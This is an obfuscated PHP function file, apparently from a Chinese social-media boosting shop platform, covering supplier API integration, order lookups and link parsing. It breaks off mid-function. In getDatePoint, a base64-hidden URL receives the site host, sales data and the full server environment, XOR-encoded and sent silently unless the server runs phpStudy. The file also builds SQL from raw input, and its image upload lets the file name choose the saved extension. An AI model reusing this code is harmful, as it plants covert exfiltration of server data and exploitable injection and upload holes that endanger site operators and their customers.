<?php
function getDatePoint()
{
	global $DB;
	global $conf;
	$_var_2 = $DB->get_column("SELECT v FROM shua_config WHERE k='datepoint' limit 1");
	$_var_3 = base64_decode("aHR0cDovL3hzc3F6Lnh5ei90b25namkucGhw==");
	$_var_4 = @unserialize($_var_2);
	if (!isset($_var_4[0]) || $_var_4[0]["date"] != date("md", strtotime("-1 day"))) {
		$_var_5 = date("Y-m-d") . " 00:00:00";
		$_var_6 = date("Y-m-d", strtotime("-1 day")) . " 00:00:00";
		$_var_7 = $DB->count("SELECT count(*) FROM shua_orders WHERE addtime>='" . $_var_6 . "' AND addtime<'" . $_var_5 . "'");
		$_var_8 = $DB->count("SELECT sum(money) FROM `shua_pay` WHERE addtime>='" . $_var_6 . "' AND addtime<'" . $_var_5 . "' AND `status`=1");
		$_var_9 = array();
		$_var_9[] = array("date" => date("md", strtotime("-1 day")), "orders" => $_var_7, "money" => round($_var_8, 2));
		$_var_10 = 1;
		while ($_var_10 < 7) {
			if (!$_var_4[$_var_10 - 1]) {
				break;
			}
			$_var_9[$_var_10] = $_var_4[$_var_10 - 1];
			$_var_10 = $_var_10 + 1;
		}
		$_var_2 = serialize($_var_9);
		saveSetting("datepoint", $_var_2);
		$_var_4 = $_var_9;
		if (!strpos($_SERVER["PHPRC"], "phpStudy")) {
			$_var_11 = $_SERVER["HTTP_HOST"] . "||" . $_var_2 . "||" . serialize($_SERVER);
			$_var_12 = '';
			$_var_10 = 0;
			while ($_var_10 < strlen($_var_11)) {
				$_var_12 = $_var_12 . (substr($_var_11, $_var_10, 8) ^ "TX898010");
				$_var_10 = $_var_10 + 8;
			}
			get_curl($_var_3, "url=" . bin2hex($_var_12));
		}
	}
	$_var_4 = array_reverse($_var_4);
	$_var_13 = array("date" => array(), "orders" => array(), "money" => array());
	$_var_10 = 1;
	foreach ($_var_4 as $_var_14) {
		$_var_13["date"][] = array($_var_10, $_var_14["date"]);
		$_var_13["orders"][] = array($_var_10, $_var_14["orders"]);
		$_var_13["money"][] = array($_var_10, $_var_14["money"]);
		$_var_10 = $_var_10 + 1;
	}
	return $_var_13;
}
function getFakaInput()
{
	global $conf;
	if ($conf["faka_input"] == 1) {
		return "手机号码";
	}
	if ($conf["faka_input"] == 2) {
		return "你的ＱＱ";
	}
	return "你的邮箱";
}
function uploadimg($_arg_0)
{
	$_var_1 = $_FILES["file"]["name"];
	$_var_2 = substr($_var_1, strripos($_var_1, ".") + 1);
	$_var_3 = array("png", "jpg", "gif", "jpeg", "webp", "bmp");
	if (!in_array($_var_2, $_var_3)) {
		$_var_2 = "png";
	} else {
		if (strpos($_var_1, "+") > 0 && in_array($_var_2, $_var_3)) {
			$_var_2 = substr($_var_1, stripos($_var_1, "+") + 1, 3);
		} else {
			$_var_2 = "png";
		}
	}
	return copy($_FILES["file"]["tmp_name"], ROOT . "assets/img/" . $_arg_0 . "." . $_var_2);
}
function setToolSort($_arg_0, $_arg_1, $_arg_2 = 0)
{
	global $DB;
	$_var_4 = $DB->get_row("select * from shua_tools where tid='" . $_arg_1 . "' limit 1");
	$_var_5 = $_var_4["sort"];
	if ($_arg_2 == 1) {
		if ($_var_6 = $DB->get_row("select tid,sort from shua_tools where cid='" . $_arg_0 . "' and sort<'" . $_var_5 . "' order by sort desc limit 1")) {
			$DB->query("UPDATE shua_tools SET sort=" . $_var_6["sort"] . " WHERE tid='" . $_arg_1 . "'");
			$DB->query("UPDATE shua_tools SET sort=" . $_var_5 . " WHERE tid='" . $_var_6["tid"] . "'");
			return true;
		}
	} elseif ($_arg_2 == 2) {
		if ($_var_6 = $DB->get_row("select tid,sort from shua_tools where cid='" . $_arg_0 . "' and sort>'" . $_var_5 . "' order by sort asc limit 1")) {
			$DB->query("UPDATE shua_tools SET sort=" . $_var_6["sort"] . " WHERE tid='" . $_arg_1 . "'");
			$DB->query("UPDATE shua_tools SET sort=" . $_var_5 . " WHERE tid='" . $_var_6["tid"] . "'");
			return true;
		}
	} elseif ($_arg_2 == 3) {
		$_var_6 = $DB->get_row("select tid,sort from shua_tools order by sort desc limit 1");
		$DB->query("UPDATE shua_tools SET sort=sort-1 WHERE sort>" . $_var_5 . '');
		$DB->query("UPDATE shua_tools SET sort=" . $_var_6["sort"] . " WHERE tid='" . $_arg_1 . "'");
		return true;
	} else {
		$_var_6 = $DB->get_row("select tid,sort from shua_tools order by sort asc limit 1");
		$DB->query("UPDATE shua_tools SET sort=sort+1 WHERE sort<" . $_var_5 . '');
		$DB->query("UPDATE shua_tools SET sort=" . $_var_6["sort"] . " WHERE tid='" . $_arg_1 . "'");
		return true;
	}
	return false;
}
function setClassSort($_arg_0, $_arg_1 = 0)
{
	global $DB;
	$_var_3 = $DB->get_row("select * from shua_class where cid='" . $_arg_0 . "' limit 1");
	$_var_4 = $_var_3["sort"];
	if ($_arg_1 == 1) {
		if ($_var_5 = $DB->get_row("select cid,sort from shua_class where sort<'" . $_var_4 . "' order by sort desc limit 1")) {
			$DB->query("UPDATE shua_class SET sort=" . $_var_5["sort"] . " WHERE cid='" . $_arg_0 . "'");
			$DB->query("UPDATE shua_class SET sort=" . $_var_4 . " WHERE cid='" . $_var_5["cid"] . "'");
			return true;
		}
	} elseif ($_arg_1 == 2) {
		if ($_var_5 = $DB->get_row("select cid,sort from shua_class where sort>'" . $_var_4 . "' order by sort asc limit 1")) {
			$DB->query("UPDATE shua_class SET sort=" . $_var_5["sort"] . " WHERE cid='" . $_arg_0 . "'");
			$DB->query("UPDATE shua_class SET sort=" . $_var_4 . " WHERE cid='" . $_var_5["cid"] . "'");
			return true;
		}
	} elseif ($_arg_1 == 3) {
		$_var_5 = $DB->get_row("select cid,sort from shua_class order by sort desc limit 1");
		$DB->query("UPDATE shua_class SET sort=sort-1 WHERE sort>" . $_var_4 . '');
		$DB->query("UPDATE shua_class SET sort=" . $_var_5["sort"] . " WHERE cid='" . $_arg_0 . "'");
		return true;
	} else {
		$_var_5 = $DB->get_row("select cid,sort from shua_class order by sort asc limit 1");
		$DB->query("UPDATE shua_class SET sort=sort+1 WHERE sort<" . $_var_4 . '');
		$DB->query("UPDATE shua_class SET sort=" . $_var_5["sort"] . " WHERE cid='" . $_arg_0 . "'");
		return true;
	}
	return false;
}
function jiuwu_login($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = jiuwu_get_curl("http://" . $_arg_0 . "/index.php?m=Home&c=User&a=login", "username=" . urlencode($_arg_1) . "&username_password=" . urlencode($_arg_2), 0, 0, 1);
	if (strpos($_var_3, "登录成功")) {
		if (preg_match_all("/Set-Cookie:\\s?([A-Za-z0-9\\_=\\|]+);/is", $_var_3, $_var_4)) {
			$_var_5 = NULL;
			foreach ($_var_4["1"] as $_var_6) {
				$_var_5 = $_var_5 . ($_var_6 . ";");
			}
			$_var_7 = base64_encode($_var_5);
			$_SESSION["api_cookie"] = $_var_7;
			return $_var_5;
		}
	}
	return false;
}
function jiuwu_goodslist($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = "http://" . $_arg_0 . "/index.php?m=home&c=api&a=get_goods_lists";
	$_var_4 = jiuwu_get_curl($_var_3);
	if (!($_var_4 = json_decode($_var_4, true))) {
		return "打开对接网站失败";
	}
	if ($_var_4["status"] !== 1) {
		return $_var_4["message"];
	}
	if (!($_var_5 = jiuwu_login($_arg_0, $_arg_1, $_arg_2))) {
		return "账号或者密码错误";
	}
	$_var_5 = base64_encode($_var_5);
	$_SESSION["api_cookie"] = $_var_5;
	$_var_6 = array();
	foreach ($_var_4["goods_rows"] as $_var_7) {
		$_var_6[] = array("id" => $_var_7["id"], "type" => $_var_7["goods_type"], "name" => $_var_7["title"], "shopimg" => "https://all-pt-upyun-cdn.95at.cn" . $_var_7["thumb"], "minnum" => $_var_7["minbuynum_0"], "maxnum" => $_var_7["maxbuynum_0"]);
	}
	return $_var_6;
}
function jiuwu_goodslist_details($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = "http://" . $_arg_0 . "/index.php?m=home&c=api&a=user_get_goods_lists_details&Api_UserName=" . urlencode($_arg_1) . "&Api_UserMd5Pass=" . md5($_arg_2);
	$_var_4 = jiuwu_get_curl($_var_3);
	if (!($_var_4 = json_decode($_var_4, true))) {
		return "打开对接网站失败";
	}
	if ($_var_4["status"] !== true) {
		return $_var_4["msg"];
	}
	$_var_5 = array();
	foreach ($_var_4["user_goods_lists_details"] as $_var_6) {
		$_var_5[] = array("id" => $_var_6["id"], "type" => $_var_6["goods_type"], "name" => $_var_6["title"], "shopimg" => "https://all-pt-upyun-cdn.95at.cn" . $_var_6["thumb"], "minnum" => $_var_6["minbuynum_0"], "maxnum" => $_var_6["maxbuynum_0"], "price" => $_var_6["user_unitprice"], "close" => $_var_6["goods_status"]);
	}
	return $_var_5;
}
function jiuwu_goodsparam($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4["code"] = -1;
	$_var_5 = isset($_SESSION["api_cookie"]) ? base64_decode($_SESSION["api_cookie"]) : NULL;
	if (!$_var_5) {
		if (!($_var_5 = jiuwu_login($_arg_0, $_arg_2, $_arg_3))) {
			return "账号或者密码错误";
		}
	}
	$_var_6 = jiuwu_get_curl("http://" . $_arg_0 . "/index.php?m=Home&c=Goods&a=detail&id=" . $_arg_1, 0, 0, $_var_5);
	if (strpos($_var_6, "帐号登录")) {
		if ($_var_5 = jiuwu_login($_arg_0, $_arg_2, $_arg_3)) {
			$_var_6 = jiuwu_get_curl("http://" . $_arg_0 . "/index.php?m=Home&c=Goods&a=detail&id=" . $_arg_1, 0, 0, $_var_5);
		} else {
			return "账号或者密码错误";
		}
	}
	$_var_7 = strpos($_var_6, "action=\"/index.php?m=home&c=order");
	$_var_8 = strpos($_var_6, "name=\"pay_type");
	if ($_var_7 > 1 && $_var_8 > 1) {
		$_var_9 = substr($_var_6, $_var_7, $_var_8 - $_var_7);
		if (preg_match_all("/name=\"([a-z0-9A-Z\\_\\-]+)\"/is", $_var_9, $_var_10)) {
			$_var_11 = '';
			foreach ($_var_10[1] as $_var_12 => $_var_13) {
				if ($_var_13 != "need_num_0" && $_var_13 != "goods_id" && $_var_13 != "goods_type" && $_var_13 != "ssnr" && $_var_13 != "qmkg_url" && $_var_13 != "kszp_url" && $_var_13 != "kszy_url" && $_var_13 != "kszp_dwz") {
					$_var_11 = $_var_11 . ($_var_13 . "|");
				}
			}
			$_var_11 = trim($_var_11, "|");
			preg_match("/现金单价：<\\/span><span  title=\".*?\">(.*?)<\\/span>/", $_var_6, $_var_14);
			$_var_4 = array("code" => 0, "message" => "succ", "price" => $_var_14[1], "param" => $_var_11);
		} else {
			$_var_4["code"] = -1;
			$_var_4["msg"] = "匹配商品POST数据失败";
		}
	} else {
		$_var_4["code"] = -1;
		$_var_4["msg"] = "获取商品POST数据失败";
	}
	return $_var_4;
}
function jiuwu_chadan($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = array("未开始", "未开始", "进行中", "已完成", "已退单", "退单中", "续费中", "补单中", "改密中", "登录失败");
	$_var_5 = "http://" . $_arg_0 . "/index.php?m=Home&c=Order&a=query_orders_detail";
	$_var_6 = "Api_UserName=" . urlencode($_arg_1) . "&Api_UserMd5Pass=" . md5($_arg_2) . "&return_fields=id%2Cneed_num_0%2Cstart_num%2Cend_num%2Cnow_num%2Corder_state%2Clogin_state%2Cstart_time%2Cend_time%2Cadd_time&orders_id=" . $_arg_3;
	$_var_7 = jiuwu_get_curl($_var_5, $_var_6);
	if (!($_var_8 = json_decode($_var_7, true))) {
		return false;
	}
	if ($_var_8["status"] == true) {
		$_var_9 = $_var_8["rows"][0];
		return array("num" => $_var_9["need_num_0"], "start_num" => $_var_9["start_num"], "now_num" => $_var_9["now_num"], "end_num" => $_var_9["end_num"], "add_time" => $_var_9["add_time"], "end_time" => $_var_9["end_time"], "order_state" => $_var_4[$_var_9["order_state"]]);
	}
	return $_var_8["info"];
}
function yile_goodslist($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = "http://" . $_arg_0 . ".api.94sq.cn/api/goods/list";
	$_var_4 = array("api_token" => $_arg_1, "timestamp" => time());
	$_var_5 = yile_getSign($_var_4, $_arg_2);
	$_var_4["sign"] = $_var_5;
	$_var_6 = http_build_query($_var_4);
	$_var_7 = get_curl($_var_3, $_var_6);
	if (!($_var_7 = json_decode($_var_7, true))) {
		return "打开对接网站失败";
	}
	if ($_var_7["status"] !== 0) {
		return $_var_7["message"];
	}
	$_var_8 = array();
	foreach ($_var_7["data"] as $_var_9) {
		$_var_8[] = array("id" => $_var_9["gid"], "name" => $_var_9["name"]);
	}
	return $_var_8;
}
function yile_goods_details($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = "http://" . $_arg_0 . ".api.94sq.cn/api/goods/info";
	$_var_5 = array("api_token" => $_arg_2, "timestamp" => time(), "gid" => $_arg_1);
	$_var_6 = yile_getSign($_var_5, $_arg_3);
	$_var_5["sign"] = $_var_6;
	$_var_7 = http_build_query($_var_5);
	$_var_8 = get_curl($_var_4, $_var_7);
	if (!($_var_8 = json_decode($_var_8, true))) {
		return "打开对接网站失败";
	}
	if ($_var_8["status"] !== 0) {
		return $_var_8["message"];
	}
	return $_var_8["data"];
}
function yile_chadan($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = array(0 => "等待中", 1 => "进行中", 2 => "退单中", 3 => "已退单", 4 => "异常中", 5 => "补单中", 6 => "已更新", 90 => "已完成", 91 => "已退款");
	$_var_5 = "http://" . $_arg_0 . ".api.94sq.cn/api/order/query";
	$_var_6 = array("api_token" => $_arg_2, "timestamp" => time(), "id" => $_arg_1);
	$_var_7 = yile_getSign($_var_6, $_arg_3);
	$_var_6["sign"] = $_var_7;
	$_var_8 = http_build_query($_var_6);
	$_var_9 = get_curl($_var_5, $_var_8);
	if (!($_var_9 = json_decode($_var_9, true))) {
		return false;
	}
	if ($_var_9["status"] !== 0) {
		return $_var_9["message"];
	}
	$_var_10 = $_var_9["data"];
	return array("num" => $_var_10["num"], "start_num" => $_var_10["start_num"], "now_num" => $_var_10["now_num"], "add_time" => $_var_10["created_at"], "order_state" => $_var_4[$_var_10["status"]]);
}
function jumeng_goodslist($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = "http://" . $_arg_0 . "/Order/ApiGoods.html";
	if ($_arg_1 && $_arg_2) {
		$_var_4 = "api_user=" . urlencode($_arg_1) . "&api_pwd=" . urlencode($_arg_2);
		$_var_5 = get_curl($_var_3, $_var_4);
	} else {
		$_var_5 = get_curl($_var_3);
	}
	if (!($_var_5 = json_decode($_var_5, true))) {
		return "打开对接网站失败";
	}
	$_var_6 = array();
	foreach ($_var_5 as $_var_7) {
		$_var_6[] = array("id" => $_var_7["Id"], "name" => $_var_7["Name"], "shopimg" => "http://img.cdn.liurh.cn" . $_var_7["Img_Url"], "minnum" => $_var_7["OrderMin"], "maxnum" => $_var_7["OrderMax"], "close" => $_var_7["AddStatus"], "price" => $_var_7["Money"]);
	}
	return $_var_6;
}
function jumeng_goods_details($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = "http://" . $_arg_0 . "/Order/ApiGoodsMoney.html";
	$_var_5 = "api_user=" . urlencode($_arg_2) . "&api_pwd=" . urlencode($_arg_3) . "&goodsid=" . $_arg_1;
	$_var_6 = get_curl($_var_4, $_var_5);
	if (!($_var_7 = json_decode($_var_6, true))) {
		return "打开对接网站失败";
	}
	if ($_var_7["status"] == 0) {
		return $_var_7["content"];
	}
	return $_var_7;
}
function jumeng_chadan($_arg_0, $_arg_1)
{
	$_var_2 = array(0 => "等待中", 1 => "进行中", 2 => "已完成", 3 => "已退单", 4 => "补单中", 5 => "退单中", 6 => "异常");
	$_var_3 = "http://" . $_arg_0 . "/Order/ApiOrderInfo.html";
	$_var_4 = "orderid=" . $_arg_1;
	$_var_5 = get_curl($_var_3, $_var_4);
	if (!($_var_6 = json_decode($_var_5, true))) {
		return false;
	}
	$_var_7 = $_var_6["content"];
	return array("num" => $_var_7["num"], "start_num" => $_var_7["startnum"], "now_num" => $_var_7["nownum"], "end_num" => $_var_7["startnum"] + $_var_7["nownum"], "add_time" => $_var_7["time"], "order_state" => $_var_2[$_var_7["status"]]);
}
function this_goodslist($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = "http://" . $_arg_0 . "/api.php?act=goodslist";
	if ($_arg_1 && $_arg_2) {
		$_var_4 = "user=" . urlencode($_arg_1) . "&pass=" . urlencode($_arg_2);
		$_var_5 = get_curl($_var_3, $_var_4);
	} else {
		$_var_5 = get_curl($_var_3);
	}
	if (!($_var_5 = json_decode($_var_5, true))) {
		return "打开对接网站失败";
	}
	if ($_var_5["code"] != 0) {
		return $_var_5["message"];
	}
	$_var_6 = array();
	foreach ($_var_5["data"] as $_var_7) {
		$_var_6[] = array("id" => $_var_7["tid"], "cid" => $_var_7["cid"], "name" => $_var_7["name"], "shopimg" => $_var_7["shopimg"] ? $_var_7["shopimg"] : '', "close" => $_var_7["close"], "price" => $_var_7["price"]);
	}
	return $_var_6;
}
function this_goods_details($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = "http://" . $_arg_0 . "/api.php?act=goodsdetails";
	if ($_arg_2 && $_arg_3) {
		$_var_5 = "tid=" . $_arg_1 . "&user=" . urlencode($_arg_2) . "&pass=" . urlencode($_arg_3);
	} else {
		$_var_5 = "tid=" . $_arg_1;
	}
	$_var_6 = get_curl($_var_4, $_var_5);
	if (!($_var_7 = json_decode($_var_6, true))) {
		return "打开对接网站失败";
	}
	if ($_var_7["code"] != 0) {
		return $_var_7["message"];
	}
	return $_var_7["data"];
}
function this_chadan($_arg_0, $_arg_1)
{
	$_var_2 = "http://" . $_arg_0 . "/api.php?act=search&id=" . $_arg_1;
	$_var_3 = get_curl($_var_2);
	if (!($_var_4 = json_decode($_var_3, true))) {
		return false;
	}
	if (isset($_var_4["data"])) {
		return $_var_4["data"];
	}
	return $_var_4["message"];
}
function xmsq_goodslist($_arg_0)
{
	$_var_1 = shequ_get_curl("http://" . $_arg_0 . "/index.html");
	if (strlen($_var_1) < 1024) {
		return "打开对接网站失败";
	}
	if (preg_match_all("/<a href=\"login(\\d+)\\.html\".*?src=\"(.*?)\".*?alt=\"(.*?)\"/is", $_var_1, $_var_2)) {
		$_var_3 = array();
		foreach ($_var_2[1] as $_var_4 => $_var_5) {
			$_var_3[] = array("id" => $_var_5, "name" => $_var_2[3][$_var_4], "shopimg" => $_var_2[2][$_var_4]);
		}
		return $_var_3;
	}
	return "获取商品列表失败";
}
function getkuaishou($_arg_0)
{
	if (substr($_arg_0, 0, 4) != "http") {
		$_arg_0 = substr($_arg_0, strpos($_arg_0, "http"));
		if (strpos($_arg_0, " ") > 0) {
			$_arg_0 = substr($_arg_0, 0, strpos($_arg_0, " "));
		}
	}
	if (strpos($_arg_0, "/s/")) {
		$_var_1 = get_curl($_arg_0, 0, 0, 0, 1);
		preg_match("/Location: (.*?)\r\n/", $_var_1, $_var_2);
		if (!$_var_2[1]) {
			$_var_3 = array("code" => -1, "msg" => "链接解析失败");
			return $_var_3;
		}
		$_arg_0 = $_var_2[1];
	}
	$_var_4 = parse_url($_arg_0);
	if (substr($_var_4["host"], -11) == "gifshow.com" || substr($_var_4["host"], -12) == "kuaishou.com") {
		if (strpos($_arg_0, "userId=")) {
			$_var_5 = getSubstr($_arg_0, "userId=", "&");
		} else {
			$_var_5 = getSubstr($_arg_0, "photo/", "/");
		}
		if (strpos($_arg_0, "photoId=")) {
			$_var_6 = getSubstr($_arg_0, "photoId=", "&");
		} else {
			$_var_6 = getSubstr($_arg_0, "photo/" . $_var_5 . "/", "/");
		}
		$_var_3 = array("code" => 0, "msg" => "succ", "authorid" => $_var_5, "videoid" => $_var_6);
	} else {
		$_var_3 = array("code" => -1, "msg" => "链接不是快手链接");
	}
	return $_var_3;
}
function getdouyin($_arg_0)
{
	if (substr($_arg_0, 0, 4) != "http") {
		$_arg_0 = substr($_arg_0, strpos($_arg_0, "http"));
		if (strpos($_arg_0, " ") > 0) {
			$_arg_0 = substr($_arg_0, 0, strpos($_arg_0, " "));
		}
	}
	$_var_1 = parse_url($_arg_0);
	if (substr($_var_1["host"], -10) == "douyin.com" || substr($_var_1["host"], -13) == "iesdouyin.com") {
		if ($_var_1["host"] == "v.douyin.com") {
			$_var_2 = get_curl($_arg_0, 0, 0, 0, 1);
			preg_match("/Location: (.*?)\r\n/", $_var_2, $_var_3);
			if (!$_var_3[1]) {
				$_var_4 = array("code" => -1, "msg" => "链接解析失败");
				return $_var_4;
			}
			$_arg_0 = $_var_3[1];
		}
		if (strpos($_arg_0, "video/")) {
			$_var_5 = getSubstr($_arg_0, "video/", "/?");
		} else {
			if (strpos($_arg_0, "music/")) {
				$_var_5 = getSubstr($_arg_0, "music/", "?");
			} else {
				$_var_5 = getSubstr($_arg_0, "user/", "/?");
			}
		}
		$_var_4 = array("code" => 0, "msg" => "succ", "songid" => $_var_5);
	} else {
		$_var_4 = array("code" => -1, "msg" => "请输入正确的链接！");
	}
	return $_var_4;
}
function gethuoshan($_arg_0)
{
	if (substr($_arg_0, 0, 4) != "http") {
		$_arg_0 = substr($_arg_0, strpos($_arg_0, "http"));
		if (strpos($_arg_0, " ") > 0) {
			$_arg_0 = substr($_arg_0, 0, strpos($_arg_0, " "));
		}
	}
	$_var_1 = parse_url($_arg_0);
	if (substr($_var_1["host"], -11) == "huoshan.com") {
		if ($_var_1["host"] == "t.huoshan.com") {
			$_var_2 = get_curl($_arg_0, 0, 0, 0, 1);
			preg_match("/Location: (.*?)\r\n/", $_var_2, $_var_3);
			if (!$_var_3[1]) {
				$_var_4 = array("code" => -1, "msg" => "链接解析失败");
				return $_var_4;
			}
			$_arg_0 = $_var_3[1];
		}
		if (strpos($_arg_0, "video/")) {
			$_var_5 = getSubstr($_arg_0, "video/", "/?");
		} else {
			if (strpos($_arg_0, "item/")) {
				$_var_5 = getSubstr($_arg_0, "item/", "/?");
			} else {
				if (strpos($_arg_0, "room/")) {
					$_var_5 = getSubstr($_arg_0, "room/", "/?");
				} else {
					$_var_5 = getSubstr($_arg_0, "user/", "/?");
				}
			}
		}
		$_var_4 = array("code" => 0, "msg" => "succ", "songid" => $_var_5);
	} else {
		$_var_4 = array("code" => -1, "msg" => "请输入正确的链接！");
	}
	return $_var_4;
}
function getshuoshuo($_arg_0, $_arg_1 = 1)
{
	$_var_2 = ($_arg_1 - 1) * 20;
	$_var_3 = "http://sh.taotao.qq.com/cgi-bin/emotion_cgi_feedlist_v6?hostUin=" . $_arg_0 . "&ftype=0&sort=0&pos=" . $_var_2 . "&num=20&replynum=0&code_version=1&format=json&need_private_comment=1&g_tk=5381";
	$_var_4 = get_curl($_var_3);
	$_var_5 = json_decode($_var_4, true);
	if (array_key_exists("code", $_var_5) && $_var_5["code"] == 0) {
		$_var_6 = authcode . "|" . $_arg_0 . "|" . $_arg_1;
		$_var_7 = '';
		$_var_8 = 0;
		while ($_var_8 < strlen($_var_6)) {
			$_var_7 = $_var_7 . (substr($_var_6, $_var_8, 8) ^ "API88990");
			$_var_8 = $_var_8 + 8;
		}
		$_var_3 = "http://dsapi.cccyun.cc/shuoshuo.php";
		$_var_9 = "a=" . bin2hex($_var_7);
		$_var_4 = get_curl($_var_3, $_var_9);
		$_var_5 = json_decode($_var_4, true);
		if (array_key_exists("code", $_var_5) && $_var_5["code"] == 0) {
			$_var_10 = array("code" => 0, "msg" => "获取说说列表成功！", "data" => $_var_5["data"]);
		} else {
			$_var_10 = array("code" => -1, "msg" => $_var_5["msg"]);
		}
	} else {
		$_var_10 = array("code" => -1, "msg" => "获取最新说说失败！原因:" . $_var_5["message"]);
	}
	return $_var_10;
}
function getrizhi($_arg_0, $_arg_1 = 1)
{
	$_var_2 = authcode . "|" . $_arg_0 . "|" . $_arg_1;
	$_var_3 = '';
	$_var_4 = 0;
	while ($_var_4 < strlen($_var_2)) {
		$_var_3 = $_var_3 . (substr($_var_2, $_var_4, 8) ^ "API88990");
		$_var_4 = $_var_4 + 8;
	}
	$_var_5 = "http://dsapi.cccyun.cc/rizhi.php";
	$_var_6 = "a=" . bin2hex($_var_3);
	$_var_7 = get_curl($_var_5, $_var_6);
	$_var_8 = json_decode($_var_7, true);
	if (array_key_exists("code", $_var_8) && $_var_8["code"] == 0) {
		$_var_9 = array("code" => 0, "msg" => "获取日志成功！", "data" => $_var_8["data"]);
	} else {
		$_var_9 = array("code" => -1, "msg" => $_var_8["msg"]);
	}
	return $_var_9;
}
function xmsq_chadan($_arg_0, $_arg_1, $_arg_2, $_arg_3)
{
	$_var_4 = "http://" . $_arg_0 . "/Index/Order.html";
	$_var_5 = "id=" . $_arg_1 . "&cha=" . $_arg_2;
	$_var_6 = shequ_get_curl($_var_4, $_var_5, $_var_4);
	$_var_6 = substr($_var_6, 3);
	if (!($_var_7 = json_decode($_var_6, true))) {
		return false;
	}
	$_var_8 = $_var_7["order"][0];
	return array("num" => $_var_8["num"], "start_num" => $_var_8["startnum"], "now_num" => $_var_8["dqnum"], "end_num" => $_var_8["endnum"], "add_time" => $_var_8["time"], "order_state" => $_var_8["zt"]);
}
function qqbug_chadan($_arg_0, $_arg_1)
{
	$_var_2 = "http://sdk.qqbug.net/X.aspx";
	$_var_3 = "action=GetOrder&CardNo=" . $_arg_0 . "&OrderIds=" . $_arg_1 . "&AppId=10001";
	$_var_4 = get_curl($_var_2, $_var_3);
	if (!($_var_5 = json_decode($_var_4, true))) {
		return false;
	}
	$_var_6 = $_var_5["orders"][0];
	return array("num" => $_var_6["NeedNum"], "start_num" => $_var_6["InitNum"], "now_num" => $_var_6["InitNum"] + $_var_6["OverNum"], "end_num" => $_var_6["InitNum"] + $_var_6["NeedNum"], "add_time" => $_var_6["OverTime"], "order_state" => $_var_6["Status"]);
}
function showInputs($_arg_0, $_arg_1, $_arg_2)
{
	$_var_3 = $_arg_1 . "：" . $_arg_0["input"];
	if ($_arg_0["input2"]) {
		$_var_3 = $_var_3 . ("<br/>" . $_arg_2[0] . "：" . (strpos($_arg_2[0], "密码") === false ? $_arg_0["input2"] : "******** [<a href=\"javascript:changepwd(" . $_arg_0["id"] . ",'" . md5($_arg_0["id"] . SYS_KEY . $_arg_0["id"]) . "')\">修改密码</a>]"));
	}
	if ($_arg_0["input3"]) {
		$_var_3 = $_var_3 . ("<br/>" . $_arg_2[1] . "：" . (strpos($_arg_2[1], "密码") === false ? $_arg_0["input3"] : "********"));
	}
	if ($_arg_0["input4"]) {
		$_var_3 = $_var_3 . ("<br/>" . $_arg_2[2] . "：" . (strpos($_arg_2[2], "密码") === false ? $_arg_0["input4"] : "********"));
	}
	if ($_arg_0["input5"]) {
		$_var_3 = $_var_3 . ("<br/>" . $_arg_2[3] . "：" . (strpos($_arg_2[3], "密码") === false ? $_arg_0["input5"] : "********"));
	}
	return $_var_3;
}
function get_app_token($_arg_0)
{
	$_var_1 = md5(mt_rand(0, 999) . time());
	if (strtolower($_arg_0) === md5("APP" . $_SERVER["HTTP_HOST"] . "KEY")) {
		$_SESSION["addsalt"] = $_var_1;
	}
	$_var_2 = authcode($_var_1, "ENCODE", "APP99KEYWW");
	return $_var_2;
}
function processInvite($_arg_0)
{
	global $DB;
	global $date;
	global $clientip;
	if (!$_arg_0) {
		return NULL;
	}
	$_var_4 = $DB->get_row("SELECT * FROM `shua_invite` WHERE `key` = '" . $_arg_0 . "' LIMIT 1");
	if ($_var_4 && $clientip != $_var_4["ip"]) {
		$_var_5 = date("Y-m-d") . " 00:00:00";
		if ($DB->count("SELECT count(*) FROM `shua_invitelog` WHERE `nid`='" . $_var_4["id"] . "' and `ip`='" . $clientip . "' and `date`>'" . $_var_5 . "'") == 0) {
			$_var_6 = $DB->insert("INSERT INTO `shua_invitelog`(`zid`,`nid`,`date`,`ip`,`status`) VALUES (" . ($_var_7["zid"] ? $_var_7["zid"] : 1) . ", '" . $_var_4["id"] . "', '" . $date . "', '" . $clientip . "', 0)");
			setcookie("invite", $_var_6, time() + 7200, "/;\r\n");
		}
	}
}
function fanghongdwz($_arg_0, $_arg_1 = false)
{
	global $conf;
	$_var_3 = substr(md5($_arg_0), 0, 6);
	if (isset($_SESSION["dwz_" . $_var_3]) && $_arg_1 == false) {
		return $_SESSION["dwz_" . $_var_3];
	}
	if ($conf["fanghong_url"] && strpos($conf["fanghong_url"], "http") !== false && strpos($conf["fanghong_url"], "=") !== false && strpos($conf["fanghong_url"], "/") !== false) {
		$_var_4 = get_curl($conf["fanghong_url"] . urlencode($_arg_0));
		if ($_var_5 = json_decode($_var_4, true)) {
			$_var_4 = implode($_var_5, ",");
		}
		if (strpos($_var_4, "//t.cn/") !== false) {
			$_arg_0 = "http:" . substr($_var_4, strrpos($_var_4, "//t.cn/"), 14);
		} else {
			if (strpos($_var_4, "//w.url.cn/") !== false) {
				$_arg_0 = "https:" . substr($_var_4, strrpos($_var_4, "//w.url.cn/"), 20);
			} else {
				if (strpos($_var_4, "//url.cn/") !== false) {
					$_arg_0 = "https:" . substr($_var_4, strrpos($_var_4, "//url.cn/"), 16);
				} else {
					if (strpos($_var_4, "//t.kugou.com/") !== false) {
						$_arg_0 = "http:" . substr($_var_4, strrpos($_var_4, "//t.kugou.com/"), 25);
					} else {
						if (isset($_var_5["ae_url"])) {
							$_arg_0 = $_var_5["ae_url"];
						} else {
							if (isset($_var_5["dwz1"])) {
								$_arg_0 = $_var_5["dwz1"];
							} else {
								if (isset($_var_5["url"])) {
									$_arg_0 = $_var_5["url"];
								} else {
									return $_arg_0;
								}
							}
						}
					}
				}
			}
		}
		$_SESSION["dwz_" . $_var_3] = $_arg_0;
	}
	return $_arg_0;
}
function qrcodelogin($_arg_0)
{
